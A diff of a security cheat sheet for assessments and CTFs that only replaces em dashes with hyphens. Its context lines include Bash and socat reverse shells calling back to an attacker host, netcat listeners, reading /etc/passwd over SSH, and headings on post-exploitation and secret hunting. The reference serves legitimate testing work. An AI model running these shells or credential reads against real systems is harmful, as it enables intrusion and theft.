@@ -1,6 +1,6 @@
 ---
 title: Security Cheatsheet
-description: Fast-reference commands for nmap, netcat, curl, openssl, PowerShell, and browser JavaScript — the essentials for security assessments and CTFs.
+description: Fast-reference commands for nmap, netcat, curl, openssl, PowerShell, and browser JavaScript - the essentials for security assessments and CTFs.
 ---
 
 # Security Cheat Sheet
@@ -11,13 +11,13 @@ Fast-reference commands for recon, enumeration, pivoting, and quick probing. Cov
 
 ## nmap
 
-### Host discovery — find live hosts on a subnet
+### Host discovery - find live hosts on a subnet
 
 ```bash
 nmap -sn 192.168.1.0/24
 ```
 
-### Quick service scan — top ports, versions, default scripts
+### Quick service scan - top ports, versions, default scripts
 
 ```bash
 nmap -sV -sC -T4 -oA scan_output <target>
@@ -35,7 +35,7 @@ nmap -p- -T4 --min-rate 5000 <target>
 nmap -O --osscan-guess <target>
 ```
 
-### UDP — top 1000 ports (slow, run with patience)
+### UDP - top 1000 ports (slow, run with patience)
 
 ```bash
 nmap -sU --top-ports 1000 -T4 <target>
@@ -117,13 +117,13 @@ nc <target> 4444 < file_to_send
 nc -u -lvnp 4444
 ```
 
-### Reverse shell — Bash (run on victim, catch on attacker)
+### Reverse shell - Bash (run on victim, catch on attacker)
 
 ```bash
 bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
 ```
 
-### Reverse shell — catch on attacker
+### Reverse shell - catch on attacker
 
 ```bash
 nc -lvnp 4444
@@ -137,7 +137,7 @@ printf 'GET / HTTP/1.0\r\nHost: <target>\r\n\r\n' | nc <target> 80
 
 ---
 
-## curl — HTTP Probing
+## curl - HTTP Probing
 
 ### Fetch response headers only
 
@@ -195,7 +195,7 @@ curl -so output.html https://<target>
 curl -x http://127.0.0.1:8080 -k https://<target>
 ```
 
-### Check CORS — preflight
+### Check CORS - preflight
 
 ```bash
 curl -I -X OPTIONS -H 'Origin: https://evil.com' \
@@ -204,7 +204,7 @@ curl -I -X OPTIONS -H 'Origin: https://evil.com' \
 
 ---
 
-## openssl — Certificate & Crypto
+## openssl - Certificate & Crypto
 
 ### Inspect a server's TLS certificate
 
@@ -256,7 +256,7 @@ openssl rand -hex 32
 
 ---
 
-## PowerShell — Recon & Post-Exploitation
+## PowerShell - Recon & Post-Exploitation
 
 ### Bypass execution policy for a session
 
@@ -365,7 +365,7 @@ Get-MpComputerStatus | Select-Object AMServiceEnabled, RealTimeProtectionEnabled
 
 ---
 
-## JavaScript Console — Browser Recon
+## JavaScript Console - Browser Recon
 
 ### Read all cookies (document-accessible)
 
@@ -546,7 +546,7 @@ hashid '<hash>'
 
 ---
 
-## Git — Secret Hunting
+## Git - Secret Hunting
 
 ### Search the entire commit history for keywords
 
@@ -591,7 +591,7 @@ gitleaks detect --source . --verbose --report-path gitleaks-report.json
 ### Scan a remote repo
 
 ```bash
-# Clone first — gitleaks --source expects a local path, not a URL
+# Clone first - gitleaks --source expects a local path, not a URL
 git clone --depth=50 https://github.com/org/repo /tmp/repo
 gitleaks detect --source /tmp/repo --verbose --report-path gitleaks-report.json
 ```
@@ -612,7 +612,7 @@ git config --list --show-origin | grep -i 'url\|credential\|token'
 
 ---
 
-## grep / ripgrep — Secret & Pattern Hunting
+## grep / ripgrep - Secret & Pattern Hunting
 
 ### Search recursively for common secret patterns
 
@@ -693,7 +693,7 @@ https?://[^:/@\s]+:[^@/\s]+@[^\s]+
 
 ---
 
-## ffuf — Web Fuzzing
+## ffuf - Web Fuzzing
 
 ### Directory/path brute-force
 
@@ -748,30 +748,30 @@ ffuf -u https://<target>/FUZZ -w wordlist.txt -fs 1234
 
 ---
 
-## SSH — Tunnelling & Pivoting
+## SSH - Tunnelling & Pivoting
 
-### Local port forward — reach an internal service via a bastion
+### Local port forward - reach an internal service via a bastion
 
 ```bash
 # Access internal:3306 as localhost:3306 via bastion
 ssh -L 3306:internal-db:3306 user@bastion -N
 ```
 
-### Remote port forward — expose your local listener through a server
+### Remote port forward - expose your local listener through a server
 
 ```bash
 # Anyone connecting to attacker:4444 lands on your local :4444
 ssh -R 4444:localhost:4444 user@<attacker> -N
 ```
 
-### Dynamic SOCKS5 proxy — proxy all traffic through a host
+### Dynamic SOCKS5 proxy - proxy all traffic through a host
 
 ```bash
 ssh -D 1080 user@bastion -N
 # Then: proxychains nmap / curl --socks5 127.0.0.1:1080
 ```
 
-### Jump host — reach a host that's only accessible from the bastion
+### Jump host - reach a host that's only accessible from the bastion
 
 ```bash
 ssh -J user@bastion user@internal-host
@@ -811,7 +811,7 @@ ssh user@<target> 'cat /etc/passwd'
 
 ---
 
-## socat — Encrypted Shells & Relays
+## socat - Encrypted Shells & Relays
 
 ### Simple listener (like nc -lvnp)
 
@@ -819,7 +819,7 @@ ssh user@<target> 'cat /etc/passwd'
 socat TCP-LISTEN:4444,reuseaddr,fork -
 ```
 
-### TLS-encrypted reverse shell — attacker listener
+### TLS-encrypted reverse shell - attacker listener
 
 ```bash
 # Generate cert first
@@ -830,13 +830,13 @@ socat OPENSSL-LISTEN:443,cert=/tmp/shell.crt,key=/tmp/shell.key,verify=0,fork \
   EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
 
-### TLS-encrypted reverse shell — victim side
+### TLS-encrypted reverse shell - victim side
 
 ```bash
 socat OPENSSL:<attacker>:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
 
-### Port relay — forward all traffic arriving on :8080 to an internal host
+### Port relay - forward all traffic arriving on :8080 to an internal host
 
 ```bash
 socat TCP-LISTEN:8080,fork TCP:<internal>:80
@@ -854,7 +854,7 @@ socat TCP:<target>:9000 < file_to_send
 
 ---
 
-## SQLMap — Injection Testing
+## SQLMap - Injection Testing
 
 ### Basic GET parameter test
 
